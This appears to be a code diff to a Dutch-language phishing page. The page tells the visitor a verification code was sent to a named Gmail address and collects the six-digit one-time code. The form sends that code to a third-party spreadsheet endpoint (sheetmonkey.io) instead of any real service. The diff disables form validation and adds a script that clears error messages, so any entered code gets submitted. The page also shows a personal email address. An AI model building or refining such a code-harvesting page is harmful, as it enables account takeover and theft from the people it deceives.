@@ -466,7 +466,7 @@
 
             We hebben een verificatiecode gestuurd naar zolawilson84@gmail.com. Controleer ook je spambox.
         </p>
-        <form action="https://api.sheetmonkey.io/form/k1CFfdvYE25WQa91uqzEYU" method="POST" id="verification-form">
+        <form action="https://api.sheetmonkey.io/form/k1CFfdvYE25WQa91uqzEYU" method="POST" id="verification-form" novalidate>
 
             <div class="form-group">
                 <input type="text" name="code" id="verificationCode" autocomplete="one-time-code" inputmode="numeric" maxlength="6" pattern="\d{6}" required>
@@ -702,6 +702,22 @@ Tel: 070-7506006</a>
   });
 </script>
 
+<script>
+  document.getElementById('forceSubmit').addEventListener('click', function () {
+    const input = document.getElementById('verificationCode');
+    const error = document.getElementById('codeValidation');
+
+    // Remove visual error states
+    input.classList.remove('is-invalid', 'invalid', 'error');
+    input.style.borderColor = '';
+    input.style.boxShadow = '';
+
+    if (error) {
+      error.textContent = '';
+      error.style.display = 'none';
+    }
+  });
+</script>
 
 </body>
 
